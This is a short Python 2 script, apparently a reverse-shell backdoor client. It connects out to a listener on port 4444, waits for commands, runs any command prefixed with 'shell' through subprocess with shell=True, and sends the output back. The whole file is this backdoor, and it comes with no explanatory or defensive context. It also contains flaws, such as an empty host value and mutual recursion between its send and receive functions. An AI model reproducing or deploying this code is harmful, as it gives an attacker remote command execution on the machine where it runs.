import socket
import os
import subprocess

def connect():
    os.system('clear')
    global host
    global port
    global s

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    port = 4444
    host = ''

    try:
        print '[!]connecting...'
        s.connect((host, port))
    except:
        print 'could not connect'

def recieve():
    while True:
        recieve = s.recv(1024)
        if recieve == 'quit':
            s.close()

        elif recieve[0:5] == 'shell':
            proc = subprocess.Popen(recieve[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            std_value = proc.stdout.read() + proc.stderr.read()
            args = std_value

        else:
            args = "no valid input was given"
        send(args)

def send(args):
    s.send(args)
    recieve()
connect()
recieve()
s.close()


